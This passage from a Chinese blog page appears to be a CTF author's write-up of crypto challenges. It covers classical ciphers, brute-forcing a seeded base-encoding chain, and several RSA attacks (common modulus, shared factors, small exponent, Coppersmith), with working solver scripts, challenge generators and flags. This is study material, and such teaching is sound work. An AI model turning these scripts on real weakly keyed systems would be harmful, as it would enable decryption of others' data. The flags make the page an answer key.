class="line">	echo &quot;&lt;script&gt; alert(&apos;Do not be silly!&apos;);parent.location.href=&apos;../../../index.php&apos;; &lt;/script&gt;&quot;;</div></pre></td></tr></table></figure></p>
+<p><strong>(php是世界上最好的语言~)</strong><br><br></p>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="这是神魔鬼"><a href="#这是神魔鬼" class="headerlink" title="这是神魔鬼"></a>这是神魔鬼</h2><p>解释<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://www.zhihu.com/question/29657078?sort=created</div></pre></td></tr></table></figure></p>
+<p>词频分析网站<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://quipqiup.com/</div></pre></td></tr></table></figure></p>
+<p>可能需要翻墙，然后就可以看到flag了<br><img src="https://i.imgur.com/wbZGGZc.png" alt=""><br><br></p>
+<h2 id="女神又来短信"><a href="#女神又来短信" class="headerlink" title="女神又来短信"></a>女神又来短信</h2><p>把电脑键盘数字字母看成第0行，第1行，第2行，第3行，然后<code>11 12 21 30 31 05 14 23 32 22 16 15 24 34 35 25 26 18 17 27 36 35</code>对应就是<code>weszx 6tfcd uygbnhj oikmn</code>，然后在键盘连起来看的话就大写的<code>ZJGS</code>，这就是flag<br><br></p>
+<h2 id="壮壮可能是疯了"><a href="#壮壮可能是疯了" class="headerlink" title="壮壮可能是疯了"></a>壮壮可能是疯了</h2><p>这题出蹦掉了，没考虑到猪圈是无大小写..<br><br></p>
+<h2 id="我这么可爱"><a href="#我这么可爱" class="headerlink" title="我这么可爱"></a>我这么可爱</h2><p>颜文字+莫斯电码+凯撒rot13+栅栏3<br>唯一值得注意的是我把{}去掉了，所以最后栅栏的时候需要选手观察到没对齐，然后想到缺少{}，去在合适的位置补上{}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">这是凯撒之后：</div><div class="line">zsflsartsnhjcailyofnhgtcsccpiuy</div><div class="line"></div><div class="line">观察如果直接用栅栏</div><div class="line">zsflsartsnh</div><div class="line">jcailyofnh</div><div class="line">gtcsccpiuy</div><div class="line"></div><div class="line">后面两行会对不齐，所以在合适的位置添上&#123;&#125;</div><div class="line">zsflsartsnh</div><div class="line">jc&#123;ailyofnh</div><div class="line">gtcsccpiuy&#125;</div><div class="line"></div><div class="line">然后再看，就会发现flag了</div><div class="line">classicalcryptoisfunnyhh</div><div class="line">根据提示删掉hh，提交就能通过了</div></pre></td></tr></table></figure></p>
+<p><br></p>
+<h2 id="贝斯家族永不言败"><a href="#贝斯家族永不言败" class="headerlink" title="贝斯家族永不言败"></a>贝斯家族永不言败</h2><p>第一关在线随便找个网站base64</p>
+<p>第二关根据base16.32.64不同的特征以及尝试，可以试出来先base64解密，再base16解密，再base32解密可以进去下一关</p>
+<p>第三关比较难一点，使用了php的种子密钥来随机加密，题目如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">import base64 as bs </div><div class="line">import random</div><div class="line"></div><div class="line">#壮壮表示他很生气，然后他发疯似的竟然用了&apos;随机数&apos;!!!</div><div class="line"></div><div class="line">flag = &quot;ZJGSCTF&#123;******&#125;&quot;</div><div class="line">random.seed(****) #len(seed)==4</div><div class="line">for i in range(20):</div><div class="line">	rand = int(random.random()*10)%3</div><div class="line">	if(rand == 0):</div><div class="line">		flag = bs.b64encode(flag)</div><div class="line">	elif(rand == 1):</div><div class="line">		flag = bs.b32encode(flag)</div><div class="line">	else :</div><div class="line">		flag = bs.b16encode(flag)</div><div class="line"></div><div class="line">open(&apos;password.txt&apos;,&apos;w&apos;).write(flag)</div><div class="line">```	</div><div class="line"></div><div class="line">爆破seed就好了，其实也很快的。</div><div class="line">三关的payload分别如下：</div></pre></td></tr></table></figure></p>
+<p>#level 2<br>import base64 as bs<br>print bs.b32decode(bs.b16decode(bs.b64decode(open(‘password.txt’,’r’).read())))<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">```</div><div class="line">#level 3</div><div class="line">import base64 as bs </div><div class="line">import random</div><div class="line"></div><div class="line">key = open(&apos;password.txt&apos;).read()</div><div class="line">for seed in range(10000):</div><div class="line">	flag = key</div><div class="line">	random.seed(seed)</div><div class="line">	print seed</div><div class="line"></div><div class="line">	rands=[]</div><div class="line">	for i in range(20):</div><div class="line">		rands.append(int(random.random()*10)%3)</div><div class="line"></div><div class="line">	try:</div><div class="line">		for rand in rands[::-1]:</div><div class="line">			if(rand == 0):</div><div class="line">				flag = bs.b64decode(flag)</div><div class="line">			elif(rand == 1):</div><div class="line">				flag = bs.b32decode(flag)</div><div class="line">			else :</div><div class="line">				flag = bs.b16decode(flag)</div><div class="line">	except:</div><div class="line">		continue	</div><div class="line">	</div><div class="line">	if(flag[0:7]==&apos;ZJGSCTF&apos;):</div><div class="line">		print flag</div><div class="line">		break</div></pre></td></tr></table></figure></p>
+<p><br></p>
+<h2 id="RSA-is-so-easy"><a href="#RSA-is-so-easy" class="headerlink" title="RSA is so easy"></a>RSA is so easy</h2><p>具体参照<a href="https://err0rzz.github.io/2017/11/14/CTF%E4%B8%ADRSA%E5%A5%97%E8%B7%AF/">https://err0rzz.github.io/2017/11/14/CTF%E4%B8%ADRSA%E5%A5%97%E8%B7%AF/</a><br><strong>level 1</strong><br>手算都能算出来的题目…<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">import gmpy2 </div><div class="line">p=251 </div><div class="line">q=179</div><div class="line">e=3</div><div class="line">c=3917</div><div class="line">d=gmpy2.invert(e,(p-1)*(q-1))</div><div class="line">m=pow(c,d,p*q)</div><div class="line">print &apos;&#123;:x&#125;&apos;.format(m).decode(&apos;hex&apos;)</div><div class="line">#aA</div></pre></td></tr></table></figure></p>
+<p><br><br><strong>level 2</strong><br>这个是第一关的升级版，只能用工具或者脚本来了。而且因为给的是n不是pq，所以还需要分解p，q可以找<a href="http://factordb.com" title="在线分解网站" target="_blank" rel="external">http://factordb.com</a>分解，或者yafu来分解<img src="https://i.imgur.com/ocBsIqK.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">import gmpy2 </div><div class="line">d =  0x5694e30aed251be0fd83de745c5443ce7c32becb</div><div class="line">p =  0x8e19061118fedaf695a3L</div><div class="line">q =  0xe9f99e00dea999ea3399L</div><div class="line">e =  0x3</div><div class="line">n =  0x81df549063b7a9d17c4745c12e905d5e2f2ce76bL</div><div class="line">c =  0x721a0dd61fe6c9b3fbfaa49e5ee636bdb842300cL</div><div class="line">d=gmpy2.invert(e,(p-1)*(q-1))</div><div class="line">m=pow(c,d,p*q)</div><div class="line">print  &apos;&#123;:x&#125;&apos;.format(m).decode(&apos;hex&apos;)</div><div class="line">#tHis_1s_level2</div></pre></td></tr></table></figure></p>
+<p><br><br><strong>level 3</strong><br>这题是共模攻击<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">import gmpy2 </div><div class="line"># d1 =  0x67d24c9a1c3cc31d1bd20ea3824ea4cd8739967d8c58d9d701b4e6e02b5156c67ae306feb3fcc568440f05b6f05061faa9a9b5fb8408772697fdc242dc9d010a9f719a339c5b4ce155356db3d2fe08eaa8a7f5f9634d21e4323194cd6f04134976e8fcc21e258cd44f3fcfde5b08ffc7084f875484ac07652a6efd4c28a8cfab</div><div class="line"># d2 =  0x2762595ec2a444c47c630167adffc53ec18518a058b5ad9bc04c527a0c4b22cb76d73bc90c310e52f9ca0e4380352700712762d191a283c34325eeb64d32c9c42c33dd9e9e2bcd31275894d92733762fe7d15d023b6486d7732ce8c1dbaf3c1ee2c9abf6e6f2fc3a68d66df715bb9c0ea06d100ec7dd4eff893eb876d02c087</div><div class="line"># p =  0xa8ce5ee8cb1d142e1115bc7e4751aa3b0df0085782b4fb5fce1f5c5f05fa22f3cb3445c97a0476d5cd1dc1fcca012efac832685604bcad7dbc88ae1117c29361L</div><div class="line"># q =  0xec2c48b342e410889d674cf086a24e17c5a3409e0dfef766fc9919fe49b4e48a9e384535c88d74e76ea59234fb5df209924c9118c393674593c93cd8528232f5L</div><div class="line">e1 =  0x3</div><div class="line">e2 =  0x65537</div><div class="line">n =  0x9bbb72e72a5b24aba9bb15f54375f7344ad661bc528546c2828f5a5040fa0229b8548a7e0dfb281c66168892687892f7fe7e90f9460cb2b9e3fca3644aeb819184250ee9788a1808ae4d2dfc8a7105b2d08f39eba5a7a59d1602d5917635246c9bca06226fca3efbb2a30bff4deca0aee6f6446d8f521fdb0ff866dba741fdd5L</div><div class="line">c1 =  0x115c687770a99906ae1f418b7082362d72a8595fc4fbc73ee9de87f21921e6937f5ce369815a13b0f4f3a273e5048c0a5c19f61e84ec42f886d2f08a3db083abb75b5a9748L</div><div class="line">c2 =  0x59c0e646a34a84ba437ecf52c5a1442e8ccfa51506ab2e6592538fcc31081d2170128009171a49322db2cd0df78da26a965efb8b402fafbac94931d1bc0597cb9d8d590948401291662896de9942e3a678e485e166b661ef51a242d9e471400612247bae3f3ac39b2e80bbf21a2eb949b77e23431b32bdb7f296c4329ea19caaL</div><div class="line"></div><div class="line">def egcd(a, b):</div><div class="line">    if a == 0:</div><div class="line">      return (b, 0, 1)</div><div class="line">    else:</div><div class="line">      g, y, x = egcd(b % a, a)</div><div class="line">      return (g, x - (b // a) * y, y)</div><div class="line">def modinv(a, m):</div><div class="line">    g, x, y = egcd(a, m)</div><div class="line">    if g != 1:</div><div class="line">      raise Exception(&apos;modular inverse does not exist&apos;)</div><div class="line">    else:</div><div class="line">      return x % m</div><div class="line">s = egcd(e1, e2)</div><div class="line">s1 = s[1]</div><div class="line">s2 = s[2]</div><div class="line">if s1&lt;0:</div><div class="line">   s1 = - s1</div><div class="line">   c1 = modinv(c1, n)</div><div class="line">elif s2&lt;0:</div><div class="line">   s2 = - s2</div><div class="line">   c2 = modinv(c2, n)</div><div class="line">m=(pow(c1,s1,n)*pow(c2,s2,n)) % n</div><div class="line">print &apos;&#123;:x&#125;&apos;.format(m).decode(&apos;hex&apos;)</div><div class="line">#hell0_you_mUst_b3_cTfer</div></pre></td></tr></table></figure></p>
+<p><br><br><strong>level 4</strong><br>这关有很多的e,n，其中有两组n是有公约数可以分解的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">import gmpy2 </div><div class="line"></div><div class="line">def gcd(a, b):  </div><div class="line">   if a &lt; b:  </div><div class="line">     a, b = b, a  </div><div class="line">   while b != 0:  </div><div class="line">     temp = a % b  </div><div class="line">     a = b  </div><div class="line">     b = temp  </div><div class="line">   return a </div><div class="line"></div><div class="line">lines = open(&apos;data.txt&apos;).readlines()</div><div class="line"></div><div class="line">ns=[]</div><div class="line">for i in range(21):</div><div class="line">  ns.append(int(lines[5*i+2][5:-2],16))</div><div class="line">  </div><div class="line">def run():</div><div class="line">  for i in range(21):</div><div class="line">    for j in range(21):</div><div class="line">      if(ns[i]==ns[j]):</div><div class="line">        continue</div><div class="line">      else :</div><div class="line">        if(gcd(ns[j],ns[i])!=1):</div><div class="line">          p=gcd(ns[i],ns[j])</div><div class="line">          print &quot;p = &quot;,p</div><div class="line">          q=ns[i]/p</div><div class="line">          print &quot;q = &quot;,q</div><div class="line">          c = int(lines[5*i+3][5:-2],16)</div><div class="line">          print i</div><div class="line">          print hex(c)</div><div class="line">          e=0x65537</div><div class="line">          d=gmpy2.invert(e,(p-1)*(q-1))</div><div class="line">          m = pow(c,d,p*q)</div><div class="line">          print &apos;&#123;:x&#125;&apos;.format(m).decode(&apos;hex&apos;)</div><div class="line">          return </div><div class="line"></div><div class="line">run()</div><div class="line">#y0u_Must_be_zz!!</div></pre></td></tr></table></figure></p>
+<p><br><br><strong>level 5</strong><br>发现密文c比n小很多，而且加密指数e也只是3，想到用<strong>e=3时小明文攻击</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">import gmpy2</div><div class="line"></div><div class="line">e =  0x3</div><div class="line">n =  0x7438b43e2186d818bce041be5d0101d2891a34015a9549f61d7df5dfdb10949c6937723de93e405bea791334d51f1d0585e006b9e400ae8be29347e39fa6ac156e24d8ca5fdc54204a2cc96bf29176858ea1d1dd3578ba14716eb3db0f60aef0e561f5ef6905e16f10025a2d7ff3f673deeae607d539eca169f3ef829fffb1b5</div><div class="line">c =  0xb3b496b9eb7ae0d251191442f5a6fb1f3e6f87f8529bc41d3c6b075c11ae141861e1469a88c6baa9fa8a29e5f3b92e3ab4900057b435329178b0a5fdc78756d2d119ca1a97e6214dce1b5569930741eacb4640214c607c25c8565a6b6d3dcc770d8fc718c0a330d142f2e702e02c401d095efcebf3aa906a3d238b97465</div><div class="line"> </div><div class="line">m = gmpy2.iroot(c,e)[0]</div><div class="line">print &apos;&#123;:x&#125;&apos;.format(m).decode(&apos;hex&apos;)</div><div class="line">#ZJGSCTF&#123;RSA_IS_so_easy_4nd_zz_is_hands0me&#125;</div></pre></td></tr></table></figure></p>
+<p>解出flag<br>接下来是每一关的生成代码，感兴趣的同学可以去熟悉一下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div></pre></td><td class="code"><pre><div class="line">#level 1</div><div class="line">from Crypto.Util.number import getPrime,long_to_bytes,bytes_to_long</div><div class="line">import random</div><div class="line">import gmpy2</div><div class="line"></div><div class="line">e=3</div><div class="line">def gcd(a, b):  </div><div class="line">   if a &lt; b:  </div><div class="line">     a, b = b, a  </div><div class="line">   while b != 0:  </div><div class="line">     temp = a % b  </div><div class="line">     a = b  </div><div class="line">     b = temp  </div><div class="line">   return a  </div><div class="line"></div><div class="line">def gen():</div><div class="line">	p=getPrime(8)</div><div class="line">	q=getPrime(8)</div><div class="line">	while(gcd(e,(p-1)*(q-1))!=1):</div><div class="line">		p=getPrime(8)</div><div class="line">		q=getPrime(8)</div><div class="line"></div><div class="line">	d=gmpy2.invert(e,(p-1)*(q-1))%(p*q)</div><div class="line">	return d,p,q</div><div class="line"></div><div class="line">d,p,q=gen()</div><div class="line">print d,p,q</div><div class="line">key=&quot;aA&quot;.encode(&apos;hex&apos;)</div><div class="line">c=pow(int(key,16),e,p*q)</div><div class="line">print c</div><div class="line"></div><div class="line"></div><div class="line">#level 2</div><div class="line">from Crypto.Util.number import getPrime,long_to_bytes,bytes_to_long</div><div class="line">import random</div><div class="line">import gmpy2</div><div class="line">e=3</div><div class="line">def gcd(a, b):  </div><div class="line">   if a &lt; b:  </div><div class="line">     a, b = b, a  </div><div class="line">   while b != 0:  </div><div class="line">     temp = a % b  </div><div class="line">     a = b  </div><div class="line">     b = temp  </div><div class="line">   return a  </div><div class="line"></div><div class="line">def gen():</div><div class="line">	p=getPrime(80)</div><div class="line">	q=getPrime(80)</div><div class="line">	while(gcd(e,(p-1)*(q-1))!=1):</div><div class="line">		p=getPrime(80)</div><div class="line">		q=getPrime(80)</div><div class="line"></div><div class="line">	d=gmpy2.invert(e,(p-1)*(q-1))%(p*q)</div><div class="line">	return d,p,q</div><div class="line"></div><div class="line">d,p,q=gen()</div><div class="line">print &apos;d = &apos;,hex(d)</div><div class="line">print &apos;p = &apos;,hex(p)</div><div class="line">print &apos;q = &apos;,hex(q)</div><div class="line">print &apos;e = &apos;,hex(e)</div><div class="line">print &apos;n = &apos;,hex(p*q)</div><div class="line">key=&quot;tHis_1s_level2&quot;.encode(&apos;hex&apos;)</div><div class="line">c=pow(int(key,16),e,p*q)</div><div class="line">print &apos;c = &apos;,hex(c)</div><div class="line"></div><div class="line"></div><div class="line">#level 3</div><div class="line">from Crypto.Util.number import getPrime,long_to_bytes,bytes_to_long</div><div class="line">import random</div><div class="line">import gmpy2</div><div class="line">e1=3</div><div class="line">e2=0x65537</div><div class="line">def gcd(a, b):  </div><div class="line">   if a &lt; b:  </div><div class="line">     a, b = b, a  </div><div class="line">   while b != 0:  </div><div class="line">     temp = a % b  </div><div class="line">     a = b  </div><div class="line">     b = temp  </div><div class="line">   return a  </div><div class="line"></div><div class="line">def gen():</div><div class="line">	p=getPrime(512)</div><div class="line">	q=getPrime(512)</div><div class="line">	while(gcd(e1,(p-1)*(q-1))!=1 ):</div><div class="line">		if(gcd(e2,(p-1)*(q-1))!=1):</div><div class="line">			continue</div><div class="line">		p=getPrime(512)</div><div class="line">		q=getPrime(512)</div><div class="line"></div><div class="line">	d1=gmpy2.invert(e1,(p-1)*(q-1))%(p*q)</div><div class="line">	d2=gmpy2.invert(e2,(p-1)*(q-1))%(p*q)</div><div class="line">	return d1,d2,p,q</div><div class="line"></div><div class="line">d1,d2,p,q=gen()</div><div class="line">print &apos;d1 = &apos;,hex(d1)</div><div class="line">print &apos;d2 = &apos;,hex(d2)</div><div class="line">print &apos;p = &apos;,hex(p)</div><div class="line">print &apos;q = &apos;,hex(q)</div><div class="line">print &apos;e1 = &apos;,hex(e1)</div><div class="line">print &apos;e2 = &apos;,hex(e2)</div><div class="line">print &apos;n = &apos;,hex(p*q)</div><div class="line">key=&quot;hell0_you_mUst_b3_cTfer&quot;.encode(&apos;hex&apos;)</div><div class="line">c1=pow(int(key,16),e1,p*q)</div><div class="line">c2=pow(int(key,16),e2,p*q)</div><div class="line">print &apos;c1 = &apos;,hex(c1)</div><div class="line">print &apos;c2 = &apos;,hex(c2)</div><div class="line"></div><div class="line"></div><div class="line">#level 4</div><div class="line">from Crypto.Util.number import getPrime,long_to_bytes,bytes_to_long</div><div class="line">import random</div><div class="line">import gmpy2</div><div class="line">e=0x65537</div><div class="line">def gcd(a, b):  </div><div class="line">   if a &lt; b:  </div><div class="line">     a, b = b, a  </div><div class="line">   while b != 0:  </div><div class="line">     temp = a % b  </div><div class="line">     a = b  </div><div class="line">     b = temp  </div><div class="line">   return a  </div><div class="line"></div><div class="line">def gen():</div><div class="line">	p=getPrime(512)</div><div class="line">	q=getPrime(512)</div><div class="line">	while(gcd(e,(p-1)*(q-1))!=1 ):</div><div class="line">		p=getPrime(512)</div><div class="line">		q=getPrime(512)</div><div class="line"></div><div class="line">	d=gmpy2.invert(e,(p-1)*(q-1))%(p*q)</div><div class="line">	return d,p,q</div><div class="line"></div><div class="line">key=&quot;y0u_Must_be_zz!!&quot;.encode(&apos;hex&apos;)</div><div class="line">p1=0</div><div class="line">for i in range(20):</div><div class="line">	print &quot;*****************round &quot;,i,&quot;**************************&quot;</div><div class="line">	d,p,q=gen()</div><div class="line">	if(i==8):</div><div class="line">		p1=p</div><div class="line">	print &quot;e = &quot;,hex(e)</div><div class="line">	print &quot;n = &quot;,hex(p*q)</div><div class="line">	c=pow(int(key,16),e,p*q)</div><div class="line">	print &quot;c = &quot;,hex(c)</div><div class="line">	print </div><div class="line"></div><div class="line">p=p1</div><div class="line">q=getPrime(512)</div><div class="line">while(gcd(e,(p-1)*(q-1))!=1 ):</div><div class="line">	q=getPrime(512)</div><div class="line">print &quot;*****************round 20**************************&quot;</div><div class="line">print &quot;e = &quot;,hex(e)</div><div class="line">print &quot;n = &quot;,hex(p*q)</div><div class="line">c=pow(int(key,16),e,p*q)</div><div class="line">print &quot;c = &quot;,hex(c)</div><div class="line">print </div><div class="line"></div><div class="line"></div><div class="line">#level 5</div><div class="line">from Crypto.Util.number import getPrime,long_to_bytes,bytes_to_long</div><div class="line">import random</div><div class="line">import gmpy2</div><div class="line">e=0x3</div><div class="line">def gcd(a, b):  </div><div class="line">   if a &lt; b:  </div><div class="line">     a, b = b, a  </div><div class="line">   while b != 0:  </div><div class="line">     temp = a % b  </div><div class="line">     a = b  </div><div class="line">     b = temp  </div><div class="line">   return a  </div><div class="line"></div><div class="line">def gen():</div><div class="line">	p=getPrime(512)</div><div class="line">	q=getPrime(512)</div><div class="line">	while(gcd(e,(p-1)*(q-1))!=1 ):</div><div class="line">		p=getPrime(512)</div><div class="line">		q=getPrime(512)</div><div class="line"></div><div class="line">	d=gmpy2.invert(e,(p-1)*(q-1))%(p*q)</div><div class="line">	return d,p,q</div><div class="line"></div><div class="line">key=&quot;ZJGSCTF&#123;RSA_IS_so_easy_4nd_zz_is_hands0me&#125;&quot;.encode(&apos;hex&apos;)</div><div class="line"></div><div class="line">print &quot;e = &quot;,hex(e)</div><div class="line"></div><div class="line">d,p,q=gen()</div><div class="line">c=pow(int(key,16),e,p*q)</div><div class="line">print &quot;n = &quot;,hex(p*q)</div><div class="line">print &quot;c = &quot;,hex(c)</div></pre></td></tr></table></figure></p>
+<p><br></p>
+<h2 id="CrazyRSA"><a href="#CrazyRSA" class="headerlink" title="CrazyRSA"></a>CrazyRSA</h2><p>明文高位已知，要求的是明文的后64位，爆破啥的就别想了。。根据<strong>Coppersmith partial information attack</strong>算法以及实现代码<a href="https://github.com/Gao-Chuan/RSA-and-LLL-attacks" target="_blank" rel="external">https://github.com/Gao-Chuan/RSA-and-LLL-attacks</a>，可以用一下的sage代码来运行，sage详细安装参照<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://err0rzz.github.io/2017/11/16/sage%E5%AE%89%E8%A3%85/</div></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">e = 0x3</div><div class="line">b = 0x5a4a47534354467b7a7a5f69735f78696e7375695f626563617573655f68655f62656c696576655f6e6f626f64795f77696c6c5f7365655f74680000000000000000</div><div class="line">n = 0x9a85c5726977dcffff471f163fb2127f69bc44e687e9461da46c9af72fae30ad7b7ebe5af927164c1a884117a6831aeb5119e0d36bef09ba183c2b8159f9c71fee4f7afc6424d81715be2b9a6bfdbf4e01430542ddea8652cc29de7f4958af7ffdcd3a76f8c28faf2e36239c8cdd7e08c1832d997b0faca28019780fe07613e5</div><div class="line">c = 0x34c9e8a4e22aad18466a9e4c1a7e141809ecc1bccf36729108b4662f07f2913c400b27720f2beca259b9917c71774681363bb3c04c26dc0db98765a5e6f6df1518a0743539cf7c5b5e9f99992f33d79aad191b975a09a1cf10661d05fc87c00e9145526a4ca3f64ded62a8fac41d68370e415c4dd96a5ee26bf4542978cd458e</div><div class="line">kbits=64</div><div class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</div><div class="line">f = (x + b)^e-c</div><div class="line">x0 = f.small_roots(X=2^kbits, beta=1)[0]</div><div class="line">print &quot;x: %s&quot; %hex(int(x0))</div></pre></td></tr></table></figure>
+<p>然后就能跑出那64位未知的<br><img src="https://i.imgur.com/5qlhV9l.png" alt=""></p>
+<p>跟已知的部分拼起来ascii码解密得到flag<br><img src="https://i.imgur.com/70uVZSA.png" alt=""></p>
+
+      
+      
+        <div class="page-reward">
+          <p><a href="javascript:void(0)" onclick="dashangToggle()" class="dashang">赏</a></p>
+          <div class="hide_box"></div>
+          <div class="shang_box">
+            <a class="shang_close" href="javascript:void(0)" onclick="dashangToggle()">×</a>
+            <div class="shang_tit">
+              <p>纯属好玩</p>
+            </div>
+            <div class="shang_payimg">
